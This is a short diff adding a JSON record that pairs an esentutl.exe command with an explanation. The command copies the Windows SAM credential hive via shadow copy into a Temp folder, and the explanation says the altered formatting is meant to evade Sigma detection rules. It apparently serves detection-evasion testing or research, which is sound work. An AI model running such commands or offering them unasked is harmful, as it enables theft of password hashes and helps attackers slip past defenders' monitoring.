@@ -1,0 +1,6 @@
+[
+  {
+    "output": "esentutl.exe /y /vss C:\\windows\\system32\\config\\SAM /d C:\\Users\\thaim\\AppData\\Local\\Temp\\SAM",
+    "explanation": "This command uses equivalent syntax and valid path formatting to bypass Sigma rule detection by maintaining the same functionality but altering spacing and path formatting."
+  }
+]
